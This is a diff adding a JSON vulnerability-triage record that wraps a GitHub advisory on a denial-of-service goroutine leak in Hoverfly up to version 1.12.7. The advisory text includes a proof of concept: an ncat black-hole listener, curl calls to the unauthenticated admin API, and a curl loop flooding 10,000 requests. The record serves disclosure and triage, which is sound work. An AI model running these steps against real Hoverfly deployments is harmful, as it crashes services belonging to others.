@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/85845881?v=4\", \"events_url\": \"https://api.github.com/users/Kr1shna4garwal/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Kr1shna4garwal/followers\", \"following_url\": \"https://api.github.com/users/Kr1shna4garwal/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Kr1shna4garwal/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Kr1shna4garwal\", \"id\": 85845881, \"login\": \"Kr1shna4garwal\", \"node_id\": \"MDQ6VXNlcjg1ODQ1ODgx\", \"organizations_url\": \"https://api.github.com/users/Kr1shna4garwal/orgs\", \"received_events_url\": \"https://api.github.com/users/Kr1shna4garwal/received_events\", \"repos_url\": \"https://api.github.com/users/Kr1shna4garwal/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Kr1shna4garwal/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Kr1shna4garwal/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Kr1shna4garwal\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-50018\", \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-400\", \"name\": \"Uncontrolled Resource Consumption\"}, {\"cwe_id\": \"CWE-770\", \"name\": \"Allocation of Resources Without Limits or Throttling\"}], \"description\": \"### Summary:\\n\\nRemote post-serve actions use `http.DefaultClient` without any timeout configuration. When the remote endpoint is unreachable or intentionally slow (accepts TCP connection but never responds), each triggered proxy request spawns a goroutine that blocks indefinitely on `http.DefaultClient.Do()`. An attacker can cause unbounded goroutine accumulation leading to memory exhaustion and process crash (OOM kill). Unlike local post-serve action execution, this requires no binary execution, only a URL pointing to a non-responsive endpoint.\\n\\n### Details:\\n\\n**1. Remote actions executed in goroutines without timeout (`core/hoverfly.go:224-228`):**\\n\\n```go\\ngo postServeAction.Execute(result.Pair, journalIDChannel, hf.Journal)\\n```\\n\\nPost-serve actions are executed in separate goroutines with no recovery wrapper.\\n\\n**2. HTTP client has no timeout (`core/action/action.go:128-143`):**\\n\\n```go\\nreq, err := http.NewRequest(\\\"POST\\\", action.Remote, bytes.NewBuffer(pairViewBytes))\\n// ...\\nresp, err := http.DefaultClient.Do(req)  // No timeout! Blocks forever.\\n```\\n\\n`http.DefaultClient` has zero timeout by default in Go. If the remote server:\\n- Accepts the TCP connection but never sends a response\\n- Establishes TLS but never completes the handshake  \\n- Uses TCP window size 0 (flow control stall)\\n\\n...the goroutine blocks indefinitely. There is no context cancellation, no deadline, and no cleanup.\\n\\n**3. No goroutine limit or backpressure:**\\n\\nThere is no limit on how many post-serve action goroutines can be active simultaneously. Each matching proxy request spawns a new one unconditionally.\\n\\n**4. The goroutine is never cleaned up:**\\n\\nThe only exit path from `Execute()` is a successful (or failed) HTTP response. A non-responding server means the goroutine lives until the process is killed.\\n\\n### Environment:\\n\\n- **Hoverfly version:** v1.12.7\\n- **Operating System:** macOS Darwin 25.4.0\\n- **Go version:** 1.26.2\\n- **Configuration:** Default (no flags required)\\n\\n### POC:\\n\\n**Step 1: Start a black-hole TCP listener (accepts connections, never responds)**\\n\\n```bash\\n# Option A: Use ncat\\nncat -l -k 9999 &\\n\\n# Option B: Use a non-routable IP (connections hang at TCP SYN)\\n# 192.0.2.1 is TEST-NET-1, guaranteed non-routable\\n# This causes http.DefaultClient to block on TCP connect timeout (which is also unlimited)\\n```\\n\\n**Step 2: Register remote post-serve action pointing to the black hole**\\n\\n```bash\\ncurl -X PUT http://localhost:8888/api/v2/hoverfly/post-serve-action \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\n    \\\"actionName\\\": \\\"leak\\\",\\n    \\\"remote\\\": \\\"http://192.0.2.1:9999/blackhole\\\",\\n    \\\"delayInMs\\\": 0\\n  }'\\n```\\n\\n**Step 3: Load a catch-all simulation**\\n\\n```bash\\ncurl -X PUT http://localhost:8888/api/v2/simulation \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\n    \\\"data\\\": {\\n      \\\"pairs\\\": [{\\n        \\\"request\\\": {\\\"path\\\": [{\\\"matcher\\\": \\\"glob\\\", \\\"value\\\": \\\"*\\\"}]},\\n        \\\"response\\\": {\\\"status\\\": 200, \\\"body\\\": \\\"ok\\\", \\\"postServeAction\\\": \\\"leak\\\"}\\n      }],\\n      \\\"globalActions\\\": {\\\"delays\\\": [], \\\"delaysLogNormal\\\": []}\\n    },\\n    \\\"meta\\\": {\\\"schemaVersion\\\": \\\"v5.2\\\"}\\n  }'\\n```\\n\\n**Step 4: Flood with requests**\\n\\n```bash\\n# Each request spawns an immortal goroutine\\nfor i in $(seq 1 10000); do\\n    curl -s -x http://localhost:8500 \\\"http://target.com/req${i}\\\" &\\n    # Throttle to avoid local FD exhaustion\\n    [ $((i % 100)) -eq 0 ] && wait\\ndone\\n```\\n\\n**Verified memory impact on Hoverfly v1.12.7:**\\n\\n```\\nMemory before: 20,064 KB\\nMemory after 50 requests: 23,376 KB\\nMemory increase: 3,312 KB (66 KB per goroutine)\\n```\\n\\nAt this rate:\\n- 1,000 requests = ~64 MB leaked\\n- 10,000 requests = ~640 MB leaked\\n- 100,000 requests = ~6.4 GB leaked → OOM crash\\n\\n### Impact:\\n\\nAn attacker with access to the admin API (unauthenticated by default) can cause a complete denial of service by:\\n\\n1. Registering a remote post-serve action pointing to a non-responsive endpoint.\\n2. Loading a catch-all simulation that triggers the action on every request.\\n3. Sending proxy traffic, each request permanently leaks a goroutine and its associated memory.\", \"ghsa_id\": \"GHSA-42j2-w334-qxw7\", \"github_reviewed_at\": \"2026-07-14T18:04:55Z\", \"html_url\": \"https://github.com/advisories/GHSA-42j2-w334-qxw7\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-42j2-w334-qxw7\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-50018\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-14T18:04:55Z\", \"references\": [\"https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-42j2-w334-qxw7\", \"https://github.com/SpectoLabs/hoverfly/pull/1228\", \"https://github.com/SpectoLabs/hoverfly/releases/tag/v1.12.8\", \"https://github.com/advisories/GHSA-42j2-w334-qxw7\"], \"repository_advisory_url\": \"https://api.github.com/repos/SpectoLabs/hoverfly/security-advisories/GHSA-42j2-w334-qxw7\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/SpectoLabs/hoverfly\", \"summary\": \"Hoverfly: Denial of Service via Goroutine Leak in Remote Post-Serve Actions\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-14T18:04:55Z\", \"url\": \"https://api.github.com/advisories/GHSA-42j2-w334-qxw7\", \"vulnerabilities\": [{\"first_patched_version\": \"1.12.8\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/SpectoLabs/hoverfly\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.12.7\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-42j2-w334-qxw7",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/SpectoLabs/hoverfly: <= 1.12.7"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-50018"
+    ],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/SpectoLabs/hoverfly"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:51:55.084105Z",
+  "provenance": {
+    "content_sha256": "0e6e654163f95bc1abaafda91dfa0083b09e65062a951bc626e21115a77bd221",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-14T18:04:55Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-42j2-w334-qxw7",
+  "status": "active",
+  "title": "Hoverfly: Denial of Service via Goroutine Leak in Remote Post-Serve Actions",
+  "updated_at": "2026-07-14T18:04:55Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-42j2-w334-qxw7"
+}
